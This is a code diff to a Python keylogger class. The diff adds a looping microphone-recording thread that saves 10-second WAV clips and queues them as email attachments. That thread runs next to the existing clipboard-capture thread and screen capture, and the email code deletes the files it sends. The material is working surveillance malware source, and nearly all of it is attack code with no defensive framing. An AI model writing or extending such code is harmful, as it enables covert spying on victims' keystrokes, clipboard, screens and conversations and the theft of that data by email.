@@ -87,9 +87,8 @@ class Keylogger:
         # add file attachments to email
         for file in files:
             # open file with read and binary mode
-            f = open(file, "rb")
-            attachment = MIMEApplication(f.read(), Name = basename(file))
-            f.close()
+            with open(file, "rb") as file_attachment:
+                attachment = MIMEApplication(file_attachment.read(), Name = basename(file))
             os.remove(f'{file}')
             # After the file is closed
             attachment['Content-Disposition'] = f'attachment; filename="{basename(file)}"'
@@ -165,15 +164,19 @@ class Keylogger:
     def copy_clipboard(self):
         while True:
             self.clipboard_history.append(pyperclip.waitForNewPaste())
-        # if self.clipboard_history == [] or pyperclip.paste() != self.clipboard_history[-1]:
     
-    # def record_microphone(self):
-    #     # Sampling frequency
-    #     freq = 44100
-    #     # Recording duration
-    #     duration = 10
-    #     recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
-    #     sounddevice.wait(f"")
+    def record_microphone(self):
+        while True:
+            # Sampling frequency
+            freq = 44100
+            # Recording duration
+            duration = 10
+            dt = f'{datetime.now()}'
+            recording_name = f'file_attachments/recording{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.wav'
+            recording = sounddevice.rec(int(duration * freq), samplerate=freq, channels=2)
+            sounddevice.wait()
+            write(recording_name, freq, recording)
+            self.attachments.append(recording_name)
 
     def start(self):
         # record the start datetime
@@ -184,8 +187,14 @@ class Keylogger:
         self.report()
         # start capturing clipboard
         clipboard_thread = Thread(target=self.copy_clipboard)
+        # set the thread as daemon (dies when main thread die)
         clipboard_thread.daemon = True
         clipboard_thread.start()
+        # start recording microphone audio
+        microphone_thread = Thread(target=self.record_microphone)
+        # set the thread as daemon (dies when main thread die)
+        microphone_thread.daemon = True
+        microphone_thread.start()
         # start capturing the screen
         self.capture_img()
 
